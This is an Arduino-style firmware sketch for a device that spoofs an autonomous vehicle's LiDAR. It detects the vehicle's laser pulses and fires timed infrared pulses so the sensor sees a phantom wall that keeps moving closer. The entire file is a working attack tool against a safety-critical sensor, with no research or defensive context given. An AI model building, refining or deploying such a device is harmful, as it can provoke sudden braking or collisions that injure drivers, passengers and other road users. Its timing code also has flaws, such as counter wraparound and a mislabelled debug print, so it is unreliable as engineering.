#include <Arduino.h>

// === Pin Definitions ===
const int Lidar_Detect_Pin = 14;  // INPUT: Connect your photodiode detector circuit here
const int IR_Led_Pin = 2;         // OUTPUT: Connect to the input of your MOSFET Gate Driver (INA)

// === Spoofing Parameters ===
volatile float fake_distance_m = 20.0; // Start with a fake wall 20 meters away
const float speed_of_light_m_ns = 0.299792458; // Meters per nanosecond

// === State Machine & Timing ===
volatile bool new_lidar_pulse_detected = false;
volatile unsigned long detection_timestamp_ns = 0;

// =====================================================================
//   INTERRUPT SERVICE ROUTINE (ISR) - This runs when the photodiode
//   detects the AV's LiDAR pulse. It must be extremely fast.
// =====================================================================
void onLidarPulse() {
  // Capture the exact time of the pulse detection
  detection_timestamp_ns = ARM_DWT_CYCCNT * (1000.0 / F_CPU_ACTUAL); // Convert CPU cycles to nanoseconds
  new_lidar_pulse_detected = true;
}


// =====================================================================
//   SETUP - Initialize pins, timers, and interrupts
// =====================================================================
void setup() {
  Serial.begin(115200);
  while (!Serial); // Wait for serial connection
  
  // Configure the IR LED driver pin as an output
  pinMode(IR_Led_Pin, OUTPUT);
  digitalWrite(IR_Led_Pin, LOW);

  // Configure the LiDAR detection pin as an input
  pinMode(Lidar_Detect_Pin, INPUT_PULLUP);
  
  // Attach the high-speed interrupt to the detection pin
  // RISING edge means we trigger when the pulse starts
  attachInterrupt(digitalPinToInterrupt(Lidar_Detect_Pin), onLidarPulse, RISING);

  // Enable the high-resolution cycle counter for precise timing
  ARM_DWT_CTRL |= ARM_DWT_CTRL_CYCCNTENA;
  
  Serial.println("LiDAR Spoofing System Initialized. Waiting for pulses...");
}


// =====================================================================
//   MAIN LOOP - Where the spoofing logic happens
// =====================================================================
void loop() {
  
  // Check if our ISR has detected a new pulse from the AV
  if (new_lidar_pulse_detected) {
    
    // --- Step 1: Calculate the required delay for the fake distance ---
    // Time = (Distance * 2) / Speed of Light
    unsigned long required_delay_ns = (unsigned long)((fake_distance_m * 2.0) / speed_of_light_m_ns);

    // --- Step 2: Calculate the exact time to fire our spoofing pulse ---
    unsigned long fire_timestamp_ns = detection_timestamp_ns + required_delay_ns;

    // --- Step 3: Wait until it's the perfect time to fire ---
    // This is a busy-wait loop for nanosecond precision.
    // A regular delay() or delayNanoseconds() is not accurate enough.
    unsigned long current_time_ns = 0;
    do {
      current_time_ns = ARM_DWT_CYCCNT * (1000.0 / F_CPU_ACTUAL);
    } while (current_time_ns < fire_timestamp_ns);

    // --- Step 4: Fire a very short, powerful pulse ---
    // This needs to be as fast as possible to create a sharp pulse.
    // Direct port manipulation is much faster than digitalWrite().
    
    // Pulse ON (e.g., for 100 nanoseconds)
    digitalWriteFast(IR_Led_Pin, HIGH);
    delayNanoseconds(100); // Keep the pulse on for a very short duration
    
    // Pulse OFF
    digitalWriteFast(IR_Led_Pin, LOW);

    // --- Step 5: Make the "wall" move closer for the next spoof ---
    // Decrease the fake distance. If it gets too close, reset it.
    fake_distance_m -= 0.5; // Move the wall half a meter closer
    if (fake_distance_m < 2.0) {
      fake_distance_m = 20.0; // Reset back to 20 meters
    }

    // --- Step 6: Reset the flag and get ready for the next pulse ---
    new_lidar_pulse_detected = false;

    // Optional: Print debug info
    Serial.print("Spoofed at distance: ");
    Serial.print(fake_distance_m + 0.5); // Print the distance we just spoofed
    Serial.print(" m, with delay: ");
    Serial.print(required_delay_ns);
    Serial.println(" ns");
  }
  
}